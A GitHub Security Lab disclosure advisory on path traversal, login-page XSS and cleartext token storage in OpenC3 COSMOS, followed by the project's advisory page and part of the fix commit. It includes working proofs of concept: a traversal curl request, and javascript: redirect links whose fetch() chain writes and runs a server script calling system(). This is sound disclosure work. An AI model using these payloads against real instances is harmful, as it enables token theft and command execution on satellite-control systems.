=== Content from securitylab.github.com_f64e76a2_20250110_161712.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

October 17, 2024
# GHSL-2024-127\_GHSL-2024-129: Remote Code Execution (RCE) via Cross-Site Scripting (XSS) in OpenC3 COSMOS - CVE-2024-43795, CVE-2024-46977, CVE-2024-47529

[![Author avatar](https://avatars.githubusercontent.com/u/176818)
Peter Stöckli](https://github.com/p-)

## Coordinated Disclosure Timeline

* 2024-07-01: Vulnerabilities were reported via GitHub’s [private vulnerability reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability) feature.
* 2024-08-23: CVE was assigned to the Cross-site scripting vulnerability by the OpenC3 maintainers.
* 2024-10-02: OpenC3 COSMOS [v5.19.0](https://github.com/OpenC3/cosmos/releases/tag/v5.19.0) was published with fixes for and advisories ([CVE-2024-46977](https://github.com/OpenC3/cosmos/security/advisories/GHSA-8jxr-mccc-mwg8), [CVE-2024-43795](https://github.com/OpenC3/cosmos/security/advisories/GHSA-vfj8-5pj7-2f9g), [CVE-2024-47529](https://github.com/OpenC3/cosmos/security/advisories/GHSA-4xqv-47rm-37mm)) for the reported vulnerabilities.

## Summary

Several vulnerabilities were found in [OpenC3 COSMOS](https://openc3.com/), a web application that is used to control satellites and test equipment. They can lead up to Remote Code Execution (RCE) via cross-site scripting (XSS).

Following issues are part of this report:

* Issue 1: Path traversal via screen controller (`GHSL-2024-127`)
* Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)
* Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

## Project

OpenC3 COSMOS

## Tested Version

[v5.16.2](https://github.com/OpenC3/cosmos/releases/tag/v5.16.2)

## Details

### Issue 1: Path traversal via screen controller (`GHSL-2024-127`)

A path traversal vulnerability inside of `LocalMode`’s `open_local_file` method allowed an authenticated user with adequate permissions to download any `.txt` via the `ScreensController#show` on the web server COSMOS is running on (depending on the file permissions).

The user-controlled parameters `target` and `screen` flow from ScreensController’s [`show`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb#L27) method:

```
  def show
    return unless authorization('system')
    screen = Screen.find(*params.require([:scope, :target, :screen]))
[..]

```

into the [`self.find`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/models/screen.rb#L39) class method of `Screen`:

```
def self.find(scope, target, screen)
    name = screen.split('*')[0].downcase # Split '*' that indicates modified - Filenames are lowercase
    body(scope, "#{target}/screens/#{name}.txt")
end

```

In this method the parameters are joined to a partial path separated by the folder `screens` and terminated by the extension `.txt`.
This partial path then flows into the [`self.body`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/target_file.rb#L92) class method of `TargetFile`:

```
def self.body(scope, name)
  name = name.split('*')[0] # Split '*' that indicates modified
  # First try opening a potentially modified version by looking for the modified target
  if ENV['OPENC3_LOCAL_MODE']
    local_file = OpenC3::LocalMode.open_local_file(name, scope: scope)
    return local_file.read if local_file
  end
[..]

```

This class method then calls [`self.open_local_file`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/local_mode.rb#L393) in `LocalMode` if the env variable `OPENC3_LOCAL_MODE` is set to `1` (the default):

```
def self.open_local_file(path, scope:)
  full_path = "#{OPENC3_LOCAL_MODE_PATH}/#{scope}/targets_modified/#{path}"
  return File.open(full_path, 'rb')
[..]

```

There the path gets joined again and then flows into a `File.open` sink.

This vulnerability was discovered with the help of CodeQL’s [Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/) query.

#### Proof of concept

Putting the different path strings from above together, gives us roughly following pattern:

```
full_path = "/plugins/DEFAULT/targets_modified/#{params[:target]}/screens/#{params[:name]}.txt"
return File.open(full_path, 'rb')

```

The default values for `OPENC3_LOCAL_MODE_PATH` and scope are used. The URL parameters `params[:target]` and `params[:screen]` are user-controllable. Both have to be properly fed for this path traversal to be exploitable: While the initial path `/plugins/DEFAULT/targets_modified/` exists on the COSMOS docker image, no subfolder named `screens` exists in this folder. Due to Linux being [fairly unforgiving](https://x.com/ulldma/status/1086249703497453568) when traversing paths a folder named `screens` has to exist somewhere. On the COSMOS docker image a folder named `screens` exists inside of `/openc3/templates/target/targets/TARGET/`. That means the URL parameter `target` needs to be used to get into that folder. The URL parameter `screen` can then be used to get to any `.txt` file.

So to fetch the file at `/openc3/python/requirements.txt` following values have to be passed to the URL parameters:

```
target = "../../../../../../openc3/templates/target/targets/TARGET"
screen = "../../../../../../openc3/python/requirements"

```

Put together as a curl command this would look like this:

```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization: <cosmos-token>' -H $'User-Agent: Mozilla/5.0' -H $'Accept: text/html' \
    $'https://<cosmos-host>/openc3-api/screen/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2ftemplates%2ftarget%2ftargets%2fTARGET/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2fpython%2frequirements?scope=DEFAULT'

```

(The values for `<cosmos-host>` and `<cosmos-token>` need to be replaced.)

#### Impact

This issue may lead to Information Disclosure.

### Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)

The login functionality of OpenC3 COSMOS (OSS Edition) contained a reflected cross-site scripting (XSS) vulnerability in [Login.vue](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue). An attacker can specify a malicious `redirect` query parameter to trigger the vulnerability. If a JavaScript URL is passed to the `redirect` parameter the attacker provided JavaScript will be executed after the user entered their password and clicked on login.

The redirect query parameter flows unchecked [from](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L145):

```
const redirect = new URLSearchParams(window.location.search).get(
      'redirect',
)

```

into the `window.location` [sink](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L148):

```
window.location = decodeURI(redirect || '/')

```

This URL needs to be accessed by a user who can reach the COSMOS instance. So an attacker might redirect a user to this URL (e.g. via Phishing email, redirect from a malicious website).

This vulnerability was discovered with the help of CodeQL’s [Client-side cross-site scripting](https://codeql.github.com/codeql-query-help/javascript/js-xss/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login:

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```

For sake of demonstration, the password of the user will be displayed in an alert. Arbitrary javascript can be executed by the attacker in the context of the victim’s session.

Due the possibility of executing code inside the script runner instance an attacker also has the possibility of creating a JavaScript which will lead to code/command execution on the server side. For example, following JavaScript creates the script `testc4.rb` with the content `system('id > /tmp/pwned4.txt')` on the server. And then calls the endpoint to run this script, which will lead to the creation of the file `/tmp/pwned4.txt` inside of the script runner.

```
fetch("/script-api/scripts/testc4.rb?scope=DEFAULT", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": localStorage.openc3Token
        },
        body: "{\"text\":\"system('id > /tmp/pwned4.txt')\"}"
    })
    .then(data => {
        fetch("/script-api/scripts/testc4.rb/run?scope=DEFAULT", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": localStorage.openc3Token
                },
                body: "{}"
            }).then(console.log("Script executed"))
    });

```

So a more powerful proof of concept that executes code on the server instance of the script runner would look like this:

```
https://<cosmos-host>/login?redirect=javascript:fetch(%22/script-api/scripts/testc5.rb?scope=DEFAULT%22,%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%5C%22text%5C%22:%5C%22system('id%20%3E%20/tmp/pwned5.txt')%5C%22%7D%22%7D).then(data%20=%3E%20%7Bfetch(%22/script-api/scripts/testc5.rb/run?scope=DEFAULT%22,%20%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%7D%22%7D).then(console.log(%22Script%20executed%22))%7D);

```
#### Impact

This issue may lead up to Remote Code Execution (RCE).

### Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

OpenC3 COSMOS (OSS Edition) stored the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128) - This could get an attacker a more permanent foothold in the COSMOS instance; assuming the COSMOS instance is accessible to the attacker. The same is true for a local attacker who could access the local storage directly (in contrast to stealing a session-id that automatically expires after some time).

[Login](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L144) function in Login.vue where the password of the user is stored in the local storage of the browser:

```
login: function () {
  localStorage.openc3Token = this.password

```

This vulnerability was discovered with the help of CodeQL’s [Clear text storage of sensitive information](https://codeql.github.com/codeql-query-help/javascript/js-clear-text-storage-of-sensitive-data/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login. Instead of displaying the password/token in an alert box the attacker could send the token to a remote server under their control. (This proof of concept makes use of the XSS vulnerability described in `GHSL-2024-128`)

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```
#### Impact

This issue may lead to Information Disclosure.

## CVE

* CVE-2024-43795 - GHSL-2024-128
* CVE-2024-46977 - GHSL-2024-127
* CVE-2024-47529 - GHSL-2024-129

## Credit

These issues were discovered and reported by GHSL team member [@p- (Peter Stöckli)](https://github.com/p-).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-127`, `GHSL-2024-128`, or `GHSL-2024-129` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_f76d9c64_20250110_161711.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fsecurity%2Fadvisories%2FGHSA-8jxr-mccc-mwg8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fsecurity%2Fadvisories%2FGHSA-8jxr-mccc-mwg8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=OpenC3%2Fcosmos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenC3](/OpenC3)
/
**[cosmos](/OpenC3/cosmos)**
Public

* [Notifications](/login?return_to=%2FOpenC3%2Fcosmos) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2FOpenC3%2Fcosmos)
* [Star
   117](/login?return_to=%2FOpenC3%2Fcosmos)

* [Code](/OpenC3/cosmos)
* [Issues
  211](/OpenC3/cosmos/issues)
* [Pull requests
  4](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects
  1](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

Additional navigation options

* [Code](/OpenC3/cosmos)
* [Issues](/OpenC3/cosmos/issues)
* [Pull requests](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

# Path traversal via screen controller (`GHSL-2024-127`)

Moderate

[ryanmelt](/ryanmelt)
published
GHSA-8jxr-mccc-mwg8
Oct 2, 2024

## Package

No package listed

## Affected versions

< 5.19.0

## Patched versions

5.19.0

## Description

### Summary

A path traversal vulnerability inside of `LocalMode`'s `open_local_file` method allows an authenticated user with adequate permissions to download any `.txt` via the `ScreensController#show` on the web server COSMOS is running on (depending on the file permissions).

Note: This CVE affects all OpenC3 COSMOS Editions

### Impact

This issue may lead to Information Disclosure.

### Severity

Moderate

### CVE ID

CVE-2024-46977

### Weaknesses

[CWE-22](/advisories?query=cwe%3A22)

### Credits

* [![@p-](https://avatars.githubusercontent.com/u/176818?s=40&v=4)](/p-)
  [p-](/p-)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_b780c287_20250110_161711.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fa34e61aea5a465f0ab3e57d833ae7ff4cafd710b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenC3%2Fcosmos%2Fcommit%2Fa34e61aea5a465f0ab3e57d833ae7ff4cafd710b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=OpenC3%2Fcosmos)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenC3](/OpenC3)
/
**[cosmos](/OpenC3/cosmos)**
Public

* [Notifications](/login?return_to=%2FOpenC3%2Fcosmos) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2FOpenC3%2Fcosmos)
* [Star
   117](/login?return_to=%2FOpenC3%2Fcosmos)

* [Code](/OpenC3/cosmos)
* [Issues
  211](/OpenC3/cosmos/issues)
* [Pull requests
  4](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects
  1](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

Additional navigation options

* [Code](/OpenC3/cosmos)
* [Issues](/OpenC3/cosmos/issues)
* [Pull requests](/OpenC3/cosmos/pulls)
* [Actions](/OpenC3/cosmos/actions)
* [Projects](/OpenC3/cosmos/projects)
* [Security](/OpenC3/cosmos/security)
* [Insights](/OpenC3/cosmos/pulse)

## Commit

[Permalink](/OpenC3/cosmos/commit/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix path traversal vulnerabilities

[Browse files](/OpenC3/cosmos/tree/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b)
Browse the repository at this point in the history

* Loading branch information

[![@ryanmelt](https://avatars.githubusercontent.com/u/184686?s=40&v=4)](/ryanmelt)

[ryanmelt](/OpenC3/cosmos/commits?author=ryanmelt "View all commits by ryanmelt")
committed
Sep 29, 2024

1 parent
[762d7e0](/OpenC3/cosmos/commit/762d7e0e93bdc2f340b1e42acccedc78994a576e)

commit a34e61a

 Show file tree

 Hide file tree

Showing
**8 changed files**
with
**206 additions**
and
**91 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* openc3-cosmos-cmd-tlm-api/app/controllers

  + openc3-cosmos-cmd-tlm-api/app/controllers/application\_controller.rb
    [application\_controller.rb](#diff-05574222900e43af4f3a02a8677999d85fcab6a57e4da77afb8a19488f9699fe)
  + openc3-cosmos-cmd-tlm-api/app/controllers/plugins\_controller.rb
    [plugins\_controller.rb](#diff-c9ed1fb5ce0d2032169b260a18c8594242714d2f66c6f6ea3462d783dab8f18e)
  + openc3-cosmos-cmd-tlm-api/app/controllers/screens\_controller.rb
    [screens\_controller.rb](#diff-7017eee377ef39de0fa5c730b82417ff0f7f5f2f8e7f0b3fab4818f6092f06ab)
  + openc3-cosmos-cmd-tlm-api/app/controllers/storage\_controller.rb
    [storage\_controller.rb](#diff-25f49e6df120984bb9c20fddab11a5d797964b01bd6af02dd1f0085a771a955a)
  + openc3-cosmos-cmd-tlm-api/app/controllers/tables\_controller.rb
    [tables\_controller.rb](#diff-335d9bf03df87c309d94d2c35ea0abb3a1b26f118b8eff2997c21695e33f4f3a)
  + openc3-cosmos-cmd-tlm-api/app/controllers/targets\_controller.rb
    [targets\_controller.rb](#diff-52dc0fdc73525999dc701940ad90417c68dc47e231452f64bb669dec14b38876)
* openc3-cosmos-script-runner-api/app/controllers

  + openc3-cosmos-script-runner-api/app/controllers/application\_controller.rb
    [application\_controller.rb](#diff-706582d98ab9b32d7023ce9eccf4d805b5ea2feb8cfbbb664e50927753de49ef)
  + openc3-cosmos-script-runner-api/app/controllers/scripts\_controller.rb
    [scripts\_controller.rb](#diff-7939ce69e0a2a27415df5f84e8f27d1640c08c031f71a703ab60e893df91e7d3)

## There are no files selected for viewing

30 changes: 30 additions & 0 deletions

30
[openc3-cosmos-cmd-tlm-api/app/controllers/application\_controller.rb](#diff-05574222900e43af4f3a02a8677999d85fcab6a57e4da77afb8a19488f9699fe "openc3-cosmos-cmd-tlm-api/app/controllers/application_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b/openc3-cosmos-cmd-tlm-api/app/controllers/application_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -57,4 +57,34 @@ def authorization(permission, target\_name: nil) |
|  |  | end |
|  |  | true |
|  |  | end |
|  |  |  |
|  |  | def sanitize\_params(param\_list, require\_params: true, allow\_forward\_slash: false) |
|  |  | if require\_params |
|  |  | result = params.require(param\_list) |
|  |  | else |
|  |  | result = [] |
|  |  | param\_list.each do |param| |
|  |  | result << params[param] |
|  |  | end |
|  |  | end |
|  |  | result.each\_with\_index do |arg, index| |
|  |  | if arg |
|  |  | # Prevent the code scanner detects: |
|  |  | # "Uncontrolled data used in path expression" |
|  |  | # This method is taken directly from the Rails source: |
|  |  | # https://api.rubyonrails.org/v5.2/classes/ActiveStorage/Filename.html#method-i-sanitized |
|  |  | if allow\_forward\_slash |
|  |  | # Sometimes we have forward slashes so optionally allow those |
|  |  | value = arg.encode(Encoding::UTF\_8, invalid: :replace, undef: :replace, replace: "�").strip.tr("\u{202E}%$|:;\t\r\n\\", "-") |
|  |  | else |
|  |  | value = arg.encode(Encoding::UTF\_8, invalid: :replace, undef: :replace, replace: "�").strip.tr("\u{202E}%$|:;/\t\r\n\\", "-") |
|  |  | end |
|  |  | if value != arg |
|  |  | render(json: { status: 'error', message: "Invalid parameter #{param\_list[index]}" }, status: 400) |
|  |  | return false |
|  |  | end |
|  |  | end |
|  |  | end |
|  |  | return result |
|  |  | end |
|  |  | end |

22 changes: 16 additions & 6 deletions

22
[openc3-cosmos-cmd-tlm-api/app/controllers/plugins\_controller.rb](#diff-c9ed1fb5ce0d2032169b260a18c8594242714d2f66c6f6ea3462d783dab8f18e "openc3-cosmos-cmd-tlm-api/app/controllers/plugins_controller.rb")

Show comments

[View file](/OpenC3/cosmos/blob/a34e61aea5a465f0ab3e57d833ae7ff4cafd710b/openc3-cosmos-cmd-tlm-api/app/controllers/plugins_controller.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -35,14 +35,17 @@ def create(update = false) |
|  |  | return unless authorization('admin') |
|  |  | file = params[:plugin] |
|  |  | if file |
|  |  | scope = sanitize\_params([:scope]) |
|  |  | return unless scope |
|  |  | scope = scope[0] |
|  |  | temp\_dir = Dir.mktmpdir |
|  |  | begin |
|  |  | gem\_file\_path = temp\_dir + '/' + file.original\_filename |
|  |  | FileUtils.cp(file.tempfile.path, gem\_file\_path) |
|  |  | if @existing\_model |
|  |  | result = OpenC3::PluginModel.install\_phase1(gem\_file\_path, existing\_variables: @existing\_model['variables'], existing\_plugin\_txt\_lines: @existing\_model['plugin\_txt\_lines'], scope: params[:scope]) |
|  |  | result = OpenC3::PluginModel.install\_phase1(gem\_file\_path, existing\_variables: @existing\_model['variables'], existing\_plugin\_txt\_lines: @existing\_model['plugin\_txt\_lines'], scope: scope) |
|  |  | else |
|  |  | result = OpenC3::PluginModel.install\_phase1(gem\_file\_path, scope: params[:scope]) |
|  |  | result = OpenC3::PluginModel.install\_phase1(gem\_file\_path, scope: scope) |
|  |  | end |
|  |  | render :json => result |
|  |  | rescue Exception => error |
| Expand All | | @@ -67,17 +70,22 @@ def update |
|  |  | def install |
|  |  | return unless authorization('admin') |
|  |  | begin |
|  |  | scope = sanitize\_params([:scope]) |
|  |  | return unless scope |
|  |  | scope = scope[0] |
|  |  | temp\_dir = Dir.mktmpdir |
|  |  | plugin\_hash\_filename = Dir::Tmpname.create(['plugin-instance-', '.json']) {} |
|  |  | plugin\_hash\_file\_path = File.join(temp\_dir, File.basename(plugin\_hash\_filename)) |
|  |  | File.open(plugin\_hash\_file\_path, 'wb') do |file| |
|  |  | file.write(params[:plugin\_hash]) |
|  |  | end |
|  |  |  |
|  |  | gem\_name = params[:id].split("\_\_")[0] |
|  |  | gem\_name = sanitize\_params([:id]) |
|  |  | return unless gem\_name |
|  |  | gem\_name = gem\_name[0].split("\_\_")[0] |
